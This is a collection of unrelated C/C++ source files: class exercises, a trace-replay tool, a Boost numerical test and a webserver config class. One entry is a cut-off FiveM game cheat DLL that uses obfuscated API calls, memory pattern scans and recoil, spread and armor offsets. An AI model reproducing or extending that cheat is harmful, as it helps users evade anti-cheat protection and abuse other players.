    "#include \"Functionilities.h\"\n#include \"EmptyContainerException.h\"\n#include \"IdNotFoundException.h\"\n\nvoid CreateObjects(Container &data)\n{\n    data[0] = std::make_shared<Car>(\n        \"c101\",\n        779000.0f,\n        \"Dizer\",\n        new Engine(300, 110.0f),\n        CarType::SEDAN);\n    data[1] = std::make_shared<Car>(\n        \"c102\",\n        1290000.0f,\n        \"City\",\n        new Engine(330, 150.0f),\n        CarType::SEDAN);\n    data[2] = std::make_shared<Car>(\n        \"c103\",\n        2122000.0f,\n        \"XUV700\",\n        new Engine(430, 190.0f),\n        CarType::SUV);\n}\n\n\nint totalHorsePower(const Container &data)\n{\n    if (data.empty())\n        throw EmptyContainerException(\"Data is Empty\");\n    \n    int hp = 0;\n    for(const CarPointer& c :data){\n        hp += c->engine()->horsePower();\n    }\n    return hp;\n}\n\nbool isAllCarAbove700K(const Container &data)\n{\n    if (data.empty())\n        throw EmptyContainerException(\"Data is Empty\");\n    \n    for(const CarPointer& c : data){\n        if(c->price()<=700000.0f) return false;\n    }\n    return true; //reaching the point mean no car has price below 7 Lacs\n}\n\nEngine *enginePointerToMinPrice(const Container &data)\n{\n    if (data.empty())\n        throw EmptyContainerException(\"Data is Empty\");\n\n    float min_price = data[0]->price();\n    Engine* e = data[0]->engine();\n\n    for(const CarPointer& c : data){\n        if(c->price()<min_price){\n            min_price = c->price();\n            e=c->engine();\n        }\n    }\n    return e;\n}\n\nfloat avgEngineTorque(const Container &data)\n{\n    if (data.empty())\n        throw EmptyContainerException(\"Data is Empty\");\n    \n    float avgVal {0.0f};\n    for(const CarPointer& c : data){\n        avgVal += c->engine()->torque();\n    }\n\n    return avgVal/data.size();\n}\n\nstd::string findCarModelByID(const Container &data, const std::string carID)\n{\n    if (data.empty())\n        throw EmptyContainerException(\"Data is Empty\");\n    \n    for(const CarPointer& c : data){\n        if(c->id()==carID) return c->model();\n    }\n    throw IdNotFoundException(\"Id not found\");\n}\n\n\n\n\n\n/*\n\n    A basic layout of a smart pointer\n                                            HEAP\n                                            0x100h\n                                            [  101  |  Harshit  |  80000.0f]\n        Stack Memory\n        [\n            mptr\n            [    0x100h    ]\n            ....\n            ....\n            ....\n        ]\n        <----------shared pointer--------->\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n*/",
    "//\n//\n//  Generated by StarUML(tm) C++ Add-In\n//\n//  @ Project : Untitled\n//  @ File Name : Nauczyciel.cpp\n//  @ Date : 17.05.2024\n//  @ Author : \n//\n//\n\n\n#include \"Nauczyciel.h\"\n\nNauczyciel::Nauczyciel(string imie, string nazwisko, string login, string haslo)\n        : Uzytkownik(imie, nazwisko, login, haslo) {\n\n}\n\nvoid Nauczyciel::dodajKurs(Kurs *kurs) {\n\n    for(int i = 0; i < this->prowadzoneKursy.size(); i++) {\n        if(this->prowadzoneKursy[i]->getNazwa() == kurs->getNazwa()) {\n            return;\n        }\n    }\n\n    this->prowadzoneKursy.push_back(kurs);\n}\n\nvoid Nauczyciel::usunKurs(Kurs *kurs) {\n    for(int i = 0; i < this->prowadzoneKursy.size(); i++) {\n        if(this->prowadzoneKursy[i] == kurs) {\n            this->prowadzoneKursy.erase(this->prowadzoneKursy.begin() + i);\n        }\n    }\n\n}\n\nvoid Nauczyciel::dodajWydzial(Wydzial *wydzial) {\n    this->wydzialy.push_back(wydzial);\n\n}\n\nvoid Nauczyciel::usunWydzial(Wydzial *wydzial) {\n\n\n    for(int i = 0; i < this->wydzialy.size(); i++) {\n        if(this->wydzialy[i] == wydzial) {\n            this->wydzialy.erase(this->wydzialy.begin() + i);\n        }\n    }\n\n}\n\nvector<Wydzial *> Nauczyciel::getWydzialy() {\n    return this->wydzialy;\n}\n\nvector<Kurs *> Nauczyciel::getProwadzoneKursy() {\n    return this->prowadzoneKursy;\n}\n\n",
    "#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <fcntl.h>\n#include <errno.h>\n#include <mntent.h>\n#include <sys/stat.h>\n#include <sys/vfs.h>\n#include <fstab.h>\n#include <iostream>\n#include <list>\n#include <string>\n#include <sys/wait.h>\n#include <linux/ioctl.h>\n#include <sys/ioctl.h>\n#include <linux/types.h>\n#include <math.h>\n#include \"simpleReplay.h\"\n\nusing namespace std;\n\n#define DAYTIME\t(24*60*60)\n\nstruct Config *config;\nstring prev_out_name;\ndouble IG_curTime;\nstring IG_outPath;\nint IG_mode;\nint mode_flag;\n\nstatic int trace_replay(char *config_name, int day);\nint print_help(void);\nint trace_init(void);\nint do_trace_replay(double day);\nint replay_basic_install(void);\nint replay_init_multimedia(void);\nstruct ReplayJob* create_replayjob(enum REPLAY_TYPE type, const char *name, const char *path, double cycle);\nstruct ReplayJob* create_replayjob(enum REPLAY_TYPE type, struct ReplayJob *replay);\nint init_replayjob(list<struct ReplayJob*> *ReplayJob_queue, list<struct App*> *Normal_list);\nint load_replayjob(list <struct ReplayJob*> *ReplayJob_queue, list<struct App*> *ins_list, list<struct App*> *unins_list, double* day);\nint store_replayjob(list <struct ReplayJob*> *ReplayJob_queue, list<struct App*> *ins_list, double day);\nint insert_replayqueue(list<struct ReplayJob*> *ReplayJob_queue, struct ReplayJob* job);\nstruct ReplayJob* create_bgjob(struct App* app);\nint uninstall_replayqueue(list<struct ReplayJob*> *ReplayJob_queue, const char *name);\n\nint replay_loading(struct ReplayJob* replay);\nint replay_loading(struct ReplayJob* replay, list<struct ReplayFile> *update_list, list<struct ReplayFile> *bg_list, char* name);\nint replay_update(struct ReplayJob* replay);\nint replay_update(struct ReplayJob* replay, list<struct ReplayFile> *update_list);\nint replay_install(list<struct ReplayJob*> *jobqueue, list<struct App*> *ins_list, list<struct App*> *unins_list, double curTime);\nint replay_uninstall(list<struct ReplayJob*> *jobqueue, list<struct App*> *ins_list, list<struct App*> *unins_list, double curTime);\nint replay_camera(struct ReplayJob* replay);\nint replay_camera_delete(struct ReplayJob* replay);\nint replay_bg(struct ReplayJob* replay);\nint replay_bg(struct ReplayJob* replay, list<struct ReplayFile> *update_list);\n\nint app_install(list<struct ReplayJob*> *jobqueue, list<struct App*> *ins_list, list<struct App*> *unins_list, \n\tlist<struct App*>::iterator it, double load, double update, double bg, int curload);\n\nstatic double get_utilization(void);\nstatic int do_fulldisk(list <struct ReplayJob*> *queue, list<struct App*> *ins_list, \n\t\t\t\t\t\tlist<struct App*> *unins_list, double curTime);\nstatic void init_db_manager(struct ReplayJob *replay_loading, char *mount_dir, string app_name, string app_path, string app_ps, int total_file);\ndouble randn (double mu, double sigma);\n\nstruct replay_stat\n{\n\tint install;\n\tint update;\n\tint loading;\n\tint uninstall;\n\tint camera_create;\n\tint camera_delete;\n};\n\nstruct replay_stat replay_stat;\n\nint print_help(void)\n{\n\tprintf(\"traceReplay 1.1(190421) Version\\n\");\n\tprintf(\"190421: READ replay\\n\");\n\tprintf(\"Usage: ./traceReplay [OPTION] JSONFile\\n\");\n\tprintf(\"[OPTION]\\n\");\n\tprintf(\"-i: initilization (INIT_FILE in JSONFile)\\n\");\n\tprintf(\"-d: end day\\n\");\n\tprintf(\"-p: prev output (replay_n.out)\\n\");\n\tprintf(\"-l: print sysfs\\n\");\n\tprintf(\"-G [OUTPUT PATH]: Input Generator mode\\n\");\n\treturn 0;\n}\n\nint main (int argc, char *argv[])\n{\n\tFILE* init_fp;\n\tint opt, i;\n\tint day = DEFAULT_DAY;\n\tFILE *fOut;\n\tmode_flag = 0;\n\tIG_mode = 0;\n\tIG_curTime = 0.0;\n\n\twhile ((opt = getopt(argc, argv, \"hd:Mip:vlG:f\")) != EOF) {\n\t\tswitch (opt) {\n\t\tcase 'h':\n\t\t\tprint_help();\n\t\t\tgoto out;\n\t\tcase 'd': \n\t\t\tday = atoi(optarg);\n\t\t\tbreak;\n\t\tcase 'i':\n\t\t\tmode_flag |= INITFILE;\n\t\t\tbreak;\n\t\tcase 'p':\n\t\t\tmode_flag |= PREV_OUT;\n\t\t\tprev_out_name = string(optarg);\n\t\t\tbreak;\n\t\tcase 'v':\n\t\t\tmode_flag |= VERBOSE;\n\t\t\tbreak;\n\t\tcase 'l':\n\t\t\tmode_flag |= SYSFS;\n\t\t\tprintf(\"print STAT\\n\");\n\t\t\tbreak;\n\t\tcase 'f':\n\t\t\tmode_flag |= FSYNCTIME;\n\t\t\tbreak;\n\t\tcase 'G':\n\t\t\tIG_mode = 1;\n\t\t\tIG_outPath = string(optarg);\n\t\t\tfOut = fopen(IG_outPath.c_str(), \"w\");\n\t\t\tcout << \"MODE IG\" << endl;\n\t\t\tif (fOut == NULL) {\n\t\t\t\tcout << \"Failed: IG output: \" << IG_outPath << endl;\n\t\t\t\tgoto out;\n\t\t\t}\n\t\t\tfclose(fOut);\n\t\t\tbreak;\n\t\tdefault:\n\t\t\tprint_help();\n\t\t\tgoto out;\n\t\t}\n\t}\n\n\tif ((argc-optind) != 1) {\n\t\tprint_help();\n\t\tgoto out;\n\t}\n\n\ttrace_replay(argv[optind], day);\n\nout:\n\treturn 0;\n}\n\nstatic int trace_replay(char *config_name, int day)\n{\n\tint app_count;\n\tconfig = new struct Config;\n\n\tif (parse_config(config_name, config) < 0)\n\t\tgoto out;\n\n\tif (mode_flag & INITFILE) {\n\t\ttrace_merge(config);\t\n\t}\n\n\tset_background_map(config);\n\n\tif (mode_flag & INITFILE) {\n\t\ttrace_init();\n\t}\n\tdo_trace_replay((double)day);\n\t\n\tapp_count = config->basic_app.app_count;\n\tif (app_count > 0) {\n\t\tdelete[] config->basic_app.apps;\n\t}\n\tapp_count = config->normal_app.app_count;\n\tif (app_count > 0) {\n\t\tdelete[] config->normal_app.apps;\n\t}\n\nout:\n\tdelete config",
    "#include \"Core.hpp\"\r\n\r\n#include \"Classes.hpp\"\r\n\r\n#include <native.hpp>\r\n\r\n#include <auth.hpp>\r\n#include <process.h>\r\nbool executedGiveWeaponToPed = false;\r\n#pragma warning(disable : 6031)\r\ntypedef struct _CLIENT_ID\r\n{\r\n\tHANDLE UniqueProcess;\r\n\tHANDLE UniqueThread;\r\n} CLIENT_ID, * PCLIENT_ID;\r\n\r\ntypedef NTSTATUS(NTAPI* RtlCreateUserThread_t)(HANDLE, PSECURITY_DESCRIPTOR, BOOLEAN, ULONG, SIZE_T, SIZE_T, PTHREAD_START_ROUTINE, PVOID, PHANDLE, PCLIENT_ID);\r\nRtlCreateUserThread_t RtlCreateUserThread = (RtlCreateUserThread_t)GetProcAddress(GetModuleHandle(\"ntdll.dll\"), \"RtlCreateUserThread\");\r\n\r\n\r\nBOOLEAN APIENTRY DllMain(HINSTANCE hk_dll, DWORD hk_reason, LPVOID hk_lpReserved)\r\n{\r\n\tUNREFERENCED_PARAMETER(hk_lpReserved);\r\n\r\n\tif (hk_reason == DLL_PROCESS_ATTACH)\r\n\t{\r\n\t\tDisableThreadLibraryCalls(hk_dll);\r\n\t\tif (DEBUG == 0)\r\n\t\t{\r\n\r\n\t\t\t\ttypedef BOOL(__stdcall* AllocConsole_t)();\r\n\t\t\t\tAllocConsole_t AllocConsole_o = (AllocConsole_t)SAFE_CALL(GetProcAddress)(SAFE_CALL(GetModuleHandleA)((E(\"kernel32.dll\"))), E(\"AllocConsole\"));\r\n\r\n\t\t\t\tAllocConsole_o();\r\n\t\t\t\tfreopen_s((FILE**)stdout, E(\"CONOUT$\"), E(\"w\"), stdout);\r\n\t\t}\r\n\r\n\r\n\r\n\r\n/*\r\n\t\t\tif (thread == TestScriptThread) {\r\n\r\n\t\t\t\tif (!executedGiveWeaponToPed) {\r\n\t\t\t\t\tWEAPON::GIVE_WEAPON_TO_PED(PLAYER::PLAYER_PED_ID(), 0xFAD1F1C9, (int)999, (bool)false, (bool)true);\r\n\r\n\t\t\t\t\texecutedGiveWeaponToPed = true;\r\n\t\t\t\t}\r\n\r\n\t\t\t}\r\n\t\t\t});\r\n\r\n\r\n\t\tDeleteScript(scriptID);\r\n\r\n\t\tAttachScripthook();*/\r\n\t\tFiveM::World = Memory::PatternScan(E(\"48 8B 05 ? ? ? ? 48 8B 48 08 48 85 C9 74 52 8B 81\"), NULL, 7);\r\n\t\tFiveM::ReplayInterface = Memory::PatternScan(E(\"48 8D 0D ? ? ? ? 89 44 24 30 E8 ? ? ? ? 48 83 C4 28 C3 48 8B 05\"), NULL, 7);\r\n\t\tFiveM::W2S = Memory::PatternScan(E(\"48 89 5C 24 ?? 55 56 57 48 83 EC 70 65 4C 8B 0C 25\"), NULL, NULL);\r\n\t\tFiveM::BonePos = Memory::PatternScan(E(\"48 89 5C 24 ?? 48 89 6C 24 ?? 48 89 74 24 ?? 57 48 83 EC 60 48 8B 01 41 8B E8 48 8B F2 48 8B F9 33 DB\"), NULL, NULL);\r\n\t\tFiveM::Camera = Memory::PatternScan(E(\"48 8B 05 ? ? ? ? 48 8B 98 ? ? ? ? EB\"), NULL, 7);\r\n\t\t//FiveM::Waypoint = Memory::PatternScan(E(\"4C 8D 05 ? ? ? ? 0F B7 C1\"), NULL, 7);\r\n     //   FiveM::IsOnFiveM = (bool)Memory::PatternScan(E(\"48 89 5C 24 ?? 55 56 57 48 83 EC 70 65 4C 8B 0C 25\"), NULL, NULL);\r\n\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_GameProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_GTAProcess.exe\"))\r\n\t\t{\r\n\t\t\tFiveM::EntityType = 0x10A8;\r\n\t\t\tFiveM::Armor = 0x14B8;\r\n\r\n\t\t\tFiveM::WeaponManager = 0x10C8;\r\n\t\t\tFiveM::PlayerInfo = 0x10B8;\r\n\t\t\tFiveM::Recoil = 0x2E8;\r\n\t\t\tFiveM::Spread = 0x74;\r\n\t\t\tFiveM::ReloadMultiplier = 0x12C;\r\n\t\t\tFiveM::AmmoType = 0x20;\r\n\t\t\tFiveM::AmmoExplosiveType = 0x24;\r\n\t\t\tFiveM::WeaponName = 0x5E0;\r\n\t\t\tFiveM::IsInAVehicule = 0x146B;\r\n\t\t\tFiveM::Range = 0x25C;\r\n\r\n\r\n\t\t}\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_b2060_GameProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2060_GTAProcess.exe\"))\r\n\t\t{\r\n\t\t\tFiveM::EntityType = 0x10B8;\r\n\t\t\tFiveM::Armor = 0x14E0;\r\n\r\n\t\t\tFiveM::WeaponManager = 0x10D8;\r\n\t\t\tFiveM::PlayerInfo = 0x10B8;\r\n\t\t\tFiveM::Recoil = 0x2F4;\r\n\t\t\tFiveM::Spread = 0x84;\r\n\t\t\tFiveM::ReloadMultiplier = 0x134;\r\n\t\t\tFiveM::AmmoType = 0x20;\r\n\t\t\tFiveM::AmmoExplosiveType = 0x24;\r\n\r\n\t\t\tFiveM::WeaponName = 0x5F0;\r\n\t\t\tFiveM::IsInAVehicule = 0x146B;\r\n\t\t\tFiveM::Range = 0x28C;\r\n\r\n\t\t}\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_b2545_GameProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2545_GTAProcess.exe\"))\r\n\t\t{\r\n\t\t\tFiveM::EntityType = 0x10B8;\r\n\t\t\tFiveM::Armor = 0x14E0 + 0x50;\r\n\r\n\t\t\tFiveM::WeaponManager = 0x10D8;\r\n\t\t\tFiveM::PlayerInfo = 0x10C8;\r\n\t\t\tFiveM::Recoil = 0x2F4;\r\n\t\t\tFiveM::Spread = 0x84;\r\n\t\t\tFiveM::ReloadMultiplier = 0x134;\r\n\t\t\tFiveM::AmmoType = 0x20;\r\n\t\t\tFiveM::AmmoExplosiveType = 0x24;\r\n\t\t\tFiveM::WeaponName = 0x5F0;\r\n\t\t\tFiveM::IsInAVehicule = 0x146B;\r\n\t\t\tFiveM::Range = 0x28C;\r\n\r\n\r\n\t\t}\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_b2612_GameProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2612_GTAProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2699_GTAProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2699_GameProcess.exe\"))\r\n\t\t{\r\n\t\t\tFiveM::EntityType = 0x10B8;\r\n\t\t\tFiveM::Armor = 0x1530;\r\n\r\n\t\t\tFiveM::WeaponManager = 0x10D8;\r\n\t\t\tFiveM::PlayerInfo = 0x10C8;\r\n\t\t\tFiveM::Recoil = 0x2F4;\r\n\t\t\tFiveM::Spread = 0x84;\r\n\t\t\tFiveM::ReloadMultiplier = 0x134;\r\n\t\t\tFiveM::AmmoType = 0x20;\r\n\t\t\tFiveM::AmmoExplosiveType = 0x24;\r\n\t\t\tFiveM::WeaponName = 0x5F0;\r\n\t\t\tFiveM::IsInAVehicule = 0x146B;\r\n\t\t\tFiveM::Range = 0x28C;\r\n\r\n\r\n\t\t}\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_b2189_GameProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2189_GTAProcess.exe\"))\r\n\t\t{\r\n\t\t\tFiveM::EntityType = 0x10B8;\r\n\t\t\tFiveM::Armor = 0x14E0;\r\n\r\n\t\t\tFiveM::WeaponManager = 0x10D8;\r\n\t\t\tFiveM::PlayerInfo = 0x10C8;\r\n\t\t\tFiveM::Recoil = 0x2F4;\r\n\t\t\tFiveM::Spread = 0x84;\r\n\t\t\tFiveM::ReloadMultiplier = 0x134;\r\n\t\t\tFiveM::AmmoType = 0x20;\r\n\t\t\tFiveM::AmmoExplosiveType = 0x24;\r\n\t\t\tFiveM::WeaponName = 0x5F0;\r\n\t\t\tFiveM::IsInAVehicule = 0x146B;\r\n\t\t\tFiveM::Range = 0x28C;\r\n\r\n\r\n\t\t}\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_b2372_GamePr",
    "/* Boost numeric test of the runge kutta steppers test file\n\n Copyright 2012 Karsten Ahnert\n Copyright 2012 Mario Mulansky\n\n Distributed under the Boost Software License, Version 1.0.\n (See accompanying file LICENSE_1_0.txt or\n copy at http://www.boost.org/LICENSE_1_0.txt)\n*/\n\n// disable checked iterator warning for msvc\n#include <boost/config.hpp>\n#ifdef BOOST_MSVC\n#pragma warning(disable : 4996)\n#endif\n\n#define BOOST_TEST_MODULE numeric_runge_kutta\n\n#include <iostream>\n#include <cmath>\n\n#include <boost/array.hpp>\n\n#include <boost/test/unit_test.hpp>\n\n#include <boost/mpl/vector.hpp>\n\n#include <boost/numeric/odeint.hpp>\n\nusing namespace boost::unit_test;\nusing namespace boost::numeric::odeint;\nnamespace mpl = boost::mpl;\n\ntypedef double value_type;\n\ntypedef boost::array<double, 2> state_type;\n\n// harmonic oscillator, analytic solution x[0] = sin( t )\nstruct osc {\n  void operator()(const state_type& x, state_type& dxdt, const double t) const {\n    dxdt[0] = x[1];\n    dxdt[1] = -x[0];\n  }\n};\n\n/* reset dispatcher */\ntemplate <class StepperCategory>\nstruct resetter {\n  template <class Stepper>\n  static void reset(Stepper& stepper) {\n  }\n};\n\ntemplate <>\nstruct resetter<explicit_error_stepper_fsal_tag> {\n  template <class Stepper>\n  static void reset(Stepper& stepper) {\n    stepper.reset();\n  }\n};\n\nBOOST_AUTO_TEST_SUITE(numeric_runge_kutta_test)\n\n/* generic test for all runge kutta steppers */\ntemplate <class Stepper>\nstruct perform_runge_kutta_test {\n  void operator()(void) {\n\n    Stepper stepper;\n    const int o = stepper.order() + 1;  // order of the error is order of approximation + 1\n\n    const state_type x0 = { { 0.0, 1.0 } };\n    state_type x1;\n    const double t = 0.0;\n    /* do a first step with dt=0.1 to get an estimate on the prefactor of the error dx = f * dt^(order+1)\n     */\n    double dt = 0.5;\n    stepper.do_step(osc(), x0, t, x1, dt);\n    const double f = 2.0 * std::abs(sin(dt) - x1[0]) / std::pow(dt, o);  // upper bound\n\n    std::cout << o << \" , \" << f << std::endl;\n\n    /* as long as we have errors above machine precision */\n    while (f * std::pow(dt, o) > 1E-16) {\n      // reset stepper which require resetting (fsal steppers)\n      resetter<typename Stepper::stepper_category>::reset(stepper);\n\n      stepper.do_step(osc(), x0, t, x1, dt);\n      std::cout << \"Testing dt=\" << dt << std::endl;\n      BOOST_CHECK_LT(std::abs(sin(dt) - x1[0]), f * std::pow(dt, o));\n      dt *= 0.5;\n    }\n  }\n};\n\n/* generic error test for all runge kutta steppers */\ntemplate <class Stepper>\nstruct perform_runge_kutta_error_test {\n  void operator()(void) {\n    Stepper stepper;\n    const int o = stepper.error_order() + 1;  // order of the error is order of approximation + 1\n\n    const state_type x0 = { { 0.0, 1.0 } };\n    state_type x1, x_err;\n    const double t = 0.0;\n    /* do a first step with dt=0.1 to get an estimate on the prefactor of the error dx = f * dt^(order+1)\n     */\n    double dt = 0.5;\n    stepper.do_step(osc(), x0, t, x1, dt, x_err);\n    const double f = 2.0 * std::abs(x_err[0]) / std::pow(dt, o);\n\n    std::cout << o << \" , \" << f << \" , \" << x0[0] << std::endl;\n\n    /* as long as we have errors above machine precision */\n    while (f * std::pow(dt, o) > 1E-16) {\n      // reset stepper which require resetting (fsal steppers)\n      resetter<typename Stepper::stepper_category>::reset(stepper);\n\n      stepper.do_step(osc(), x0, t, x1, dt, x_err);\n      std::cout << \"Testing dt=\" << dt << \": \" << x_err[1] << std::endl;\n      BOOST_CHECK_SMALL(std::abs(x_err[0]), f * std::pow(dt, o));\n      dt *= 0.5;\n    }\n  }\n};\n\ntypedef mpl::vector<euler<state_type>, modified_midpoint<state_type>, runge_kutta4<state_type>,\n                    runge_kutta4_classic<state_type>, runge_kutta_cash_karp54_classic<state_type>,\n                    runge_kutta_cash_karp54<state_type>, runge_kutta_dopri5<state_type>,\n                    runge_kutta_fehlberg78<state_type> >\n    runge_kutta_steppers;\n\nBOOST_AUTO_TEST_CASE_TEMPLATE(runge_kutta_test, Stepper, runge_kutta_steppers) {\n  perform_runge_kutta_test<Stepper> tester;\n  tester();\n}\n\ntypedef mpl::vector<runge_kutta_cash_karp54_classic<state_type>, runge_kutta_cash_karp54<state_type>,\n                    runge_kutta_dopri5<state_type>, runge_kutta_fehlberg78<state_type> >\n    runge_kutta_error_steppers;\n\nBOOST_AUTO_TEST_CASE_TEMPLATE(runge_kutta_error_test, Stepper, runge_kutta_error_steppers) {\n  perform_runge_kutta_error_test<Stepper> tester;\n  tester();\n}\n\nBOOST_AUTO_TEST_SUITE_END()\n",
    "#include <iostream>\r\nusing namespace std;\r\n\r\nclass abc {\r\npublic:\r\n    int price, bid;\r\n    string title, author;\r\n    abc* next;\r\n\r\n    void accept();\r\n    void display();\r\n    void search();\r\n    void update();\r\n    void insert_AF();\r\n    void insert_AE();\r\n    void Delete_FN();\r\n    void Delete_LN();\r\n};\r\n\r\nabc* start = nullptr;\r\nabc* last = nullptr;\r\n\r\nvoid abc::accept() {\r\n    abc* newnode = new abc;\r\n    cout << \"Enter bid, price, title, author: \";\r\n    cin >> newnode->bid >> newnode->price >> newnode->title >> newnode->author;\r\n    newnode->next = nullptr;\r\n    if (start == nullptr) {\r\n        last = start = newnode;\r\n    }\r\n    else {\r\n        last->next = newnode;\r\n        last = newnode;\r\n    }\r\n}\r\n\r\nvoid abc::display() {\r\n    abc* temp = start;\r\n    if (temp == nullptr) {\r\n        cout << \"List is empty\" << endl;\r\n    }\r\n    else {\r\n        while (temp != nullptr) {\r\n            cout << temp->bid << \"\\t\" << temp->price << \"\\t\" << temp->title << \"\\t\" << temp->author << endl;\r\n            temp = temp->next;\r\n        }\r\n    }\r\n}\r\n\r\nvoid abc::search() {\r\n    int id;\r\n    cout << \"Enter book id you want to search: \";\r\n    cin >> id;\r\n    abc* temp = start;\r\n    bool found = false;\r\n    while (temp != nullptr) {\r\n        if (temp->bid == id) {\r\n            found = true;\r\n            cout << \"Book available\" << endl;\r\n            cout << temp->bid << \"\\t\" << temp->price << \"\\t\" << temp->title << \"\\t\" << temp->author << endl;\r\n            break;\r\n        }\r\n        temp = temp->next;\r\n    }\r\n    if (!found) {\r\n        cout << \"Book not found\" << endl;\r\n    }\r\n}\r\n\r\nvoid abc::update() {\r\n    int bookid;\r\n    cout << \"Enter the book id you want to update: \";\r\n    cin >> bookid;\r\n    abc* temp = start;\r\n    bool found = false;\r\n    while (temp != nullptr) {\r\n        if (temp->bid == bookid) {\r\n            found = true;\r\n            cout << \"Book available. Enter new bid, price, title, author: \";\r\n            cin >> temp->bid >> temp->price >> temp->title >> temp->author;\r\n            break;\r\n        }\r\n        temp = temp->next;\r\n    }\r\n    if (!found) {\r\n        cout << \"Book not found\" << endl;\r\n    }\r\n}\r\n\r\nvoid abc::Delete_FN() {\r\n    if (start == nullptr) {\r\n        cout << \"List is empty. Cannot delete.\" << endl;\r\n        return;\r\n    }\r\n    abc* temp = start;\r\n    start = start->next;\r\n    delete temp;\r\n}\r\n\r\nvoid abc::Delete_LN() {\r\n     if (start == nullptr) {\r\n        cout << \"List is empty. Cannot delete.\" << endl;\r\n        return;\r\n    }\r\n    if (start->next == nullptr) {\r\n        delete start;\r\n        start = nullptr;\r\n        last = nullptr;\r\n        return;\r\n    }\r\n    abc* temp = start;\r\n    while (temp->next != last) {\r\n        temp = temp->next;\r\n    }\r\n    delete last;\r\n    last = temp;\r\n    last->next = nullptr;\r\n\r\n}\r\n\r\nvoid abc::insert_AF() {\r\n    abc* newnode = new abc;\r\n    cout << \"Enter bid, price, title, author to insert at the beginning: \";\r\n    cin >> newnode->bid >> newnode->price >> newnode->title >> newnode->author;\r\n    newnode->next = start;\r\n    start = newnode;\r\n}\r\n\r\nvoid abc::insert_AE() {\r\n    abc* newnode = new abc;\r\n    cout << \"Enter bid, price, title, author to insert at the end: \";\r\n    cin >> newnode->bid >> newnode->price >> newnode->title >> newnode->author;\r\n    newnode->next = nullptr;\r\n    if (start == nullptr) {\r\n        start = last = newnode;\r\n    }\r\n    else {\r\n        last->next = newnode;\r\n        last = newnode;\r\n    }\r\n}\r\n\r\nint main() {\r\n    int ch;\r\n    abc obj;\r\n    do {\r\n        cout << \"\\nMENU\" << endl;\r\n        cout << \"1. Accept()\" << endl;\r\n        cout << \"2. Display()\" << endl;\r\n        cout << \"3. Search()\" << endl;\r\n        cout << \"4. Update()\" << endl;\r\n        cout << \"5. Insert_AF()\" << endl;\r\n        cout << \"6. Insert_AE()\" << endl;\r\n        cout << \"7. Delete_first_node()\" << endl;\r\n        cout << \"8. Delete_last_node()\" << endl;\r\n        cout << \"9. Exit\" << endl;\r\n        cout << \"Enter your choice: \";\r\n        cin >> ch;\r\n\r\n        switch (ch) {\r\n        case 1:\r\n            obj.accept();\r\n            break;\r\n        case 2:\r\n            obj.display();\r\n            break;\r\n        case 3:\r\n            obj.search();\r\n            break;\r\n        case 4:\r\n            obj.update();\r\n            break;\r\n        case 5:\r\n            obj.insert_AF();\r\n            break;\r\n        case 6:\r\n            obj.insert_AE();\r\n            break;\r\n        case 7:\r\n            obj.Delete_FN();\r\n            cout<<\"deleted successfully\";\r\n            break;\r\n        case 8:\r\n            obj.Delete_LN();\r\n            cout<<\"deleted successfully\";\r\n            break;\r\n        case 9:\r\n            cout << \"Exiting program.\" << endl;\r\n            break;\r\n        default:\r\n            cout << \"Invalid choice. Please try again.\" << endl;\r\n        }\r\n    } while (ch != 9);\r\n\r\n\u00a0\u00a0\u00a0\u00a0return\u00a00;\r\n}\r\n",
    "/* ************************************************************************** */\n/*                                                                            */\n/*                                                        :::      ::::::::   */\n/*   CFGlocation.cpp                                    :+:      :+:    :+:   */\n/*                                                    +:+ +:+         +:+     */\n/*   By: jaromero <jaromero@student.42malaga.com    +#+  +:+       +#+        */\n/*                                                +#+#+#+#+#+   +#+           */\n/*   Created: 2023/10/19 00:12:20 by jaromero          #+#    #+#             */\n/*   Updated: 2023/12/05 13:08:24 by jaromero         ###   ########.fr       */\n/*                                                                            */\n/* ************************************************************************** */\n\n#include \"CFGlocation.hpp\"\n\nCFGlocation::CFGlocation(void)\n{\n    this->name_location.clear();\n    this->root.clear();\n    this->index.clear();\n    this->try_files.clear();\n    this->allow_methods.clear();\n    this->autoindex.clear();\n    this->fastcgi_pass.clear();\n    this->fastcgi_index.clear();\n    this->nbrparam = 0;\n    this->fastcgi_param.clear();\n    this->client_max_body_size = 0;\n    this->upload_store.clear();\n    this->upload_pass.clear();\n    this->nbr_upload_set = 0;\n    this->upload_set_form_field.clear();\n}\n\nCFGlocation::CFGlocation(CFGlocation const &copy)\n{\n    this->name_location = copy.name_location;\n    this->root = copy.root;\n    this->index = copy.index;\n    this->try_files = copy.try_files;\n    this->allow_methods = copy.allow_methods;\n    this->autoindex = copy.autoindex;\n    this->fastcgi_pass = copy.fastcgi_pass;\n    this->fastcgi_index = copy.fastcgi_index;\n    this->nbrparam = copy.nbrparam;\n    this->fastcgi_param = copy.fastcgi_param;\n    this->client_max_body_size = copy.client_max_body_size;\n    this->upload_store = copy.upload_store;\n    this->upload_pass = copy.upload_pass;\n    this->nbr_upload_set = copy.nbr_upload_set;\n    this->upload_set_form_field = copy.upload_set_form_field;\n}\n\nCFGlocation::~CFGlocation()\n{\n    this->clear();\n}\n\nCFGlocation&    CFGlocation::operator=(CFGlocation const &pointer)\n{\n    this->name_location = pointer.name_location;\n    this->root = pointer.root;\n    this->index = pointer.index;\n    this->try_files = pointer.try_files;\n    this->allow_methods = pointer.allow_methods;\n    this->autoindex = pointer.autoindex;\n    this->fastcgi_pass = pointer.fastcgi_pass;\n    this->fastcgi_index = pointer.fastcgi_index;\n    this->nbrparam = pointer.nbrparam;\n    this->fastcgi_param = pointer.fastcgi_param;\n    this->client_max_body_size = pointer.client_max_body_size;\n    